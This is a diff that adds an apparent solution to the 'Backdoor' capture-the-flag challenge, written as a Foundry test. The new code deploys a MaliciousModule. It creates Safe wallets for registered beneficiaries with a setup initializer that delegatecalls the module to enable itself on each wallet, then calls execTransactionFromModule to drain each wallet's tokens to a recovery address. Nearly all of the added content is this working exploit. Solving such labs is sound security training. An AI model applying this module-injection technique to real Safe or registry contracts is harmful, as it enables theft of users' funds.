@@ -4,9 +4,11 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +72,38 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
+        MaliciousModule maliciousModule = new MaliciousModule();
         
+        for (uint256 i = 0; i < users.length; i++) {
+            address beneficiary = users[i];
+            address[] memory owners = new address[](1);
+            owners[0] = beneficiary;
+
+            bytes memory initializer = abi.encodeCall(
+                Safe.setup,
+                (
+                    owners,
+                    1, // threshold
+                    address(maliciousModule), // to: delegatecall to malicious module
+                    abi.encodeCall(maliciousModule.setupModule, (address(maliciousModule))), // data: call setupModule
+                    address(0), // fallbackHandler
+                    address(0), // paymentToken
+                    0, // payment
+                    payable(address(0)) // paymentReceiver
+                )
+            );
+
+            // Create proxy
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                0, // nonce
+                walletRegistry // callback
+            );
+
+            // Drain funds using the module
+            maliciousModule.exec(address(proxy), address(token), recovery, 10e18);
+        }
     }
 
     /**
@@ -92,5 +125,20 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract MaliciousModule {
+    function setupModule(address module) external {
+        // Enable this contract as a module on the Safe (address(this))
+        // We use a low-level call to ensure msg.sender is the Safe itself
+        (bool success, ) = address(this).call(abi.encodeWithSignature("enableModule(address)", module));
+        require(success, "Module enablement failed");
+    }
+
+    function exec(address proxy, address token, address recipient, uint256 amount) external {
+        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", recipient, amount);
+        bool success = Safe(payable(proxy)).execTransactionFromModule(token, 0, data, Enum.Operation.Call);
+        require(success, "Module execution failed");
     }
 }
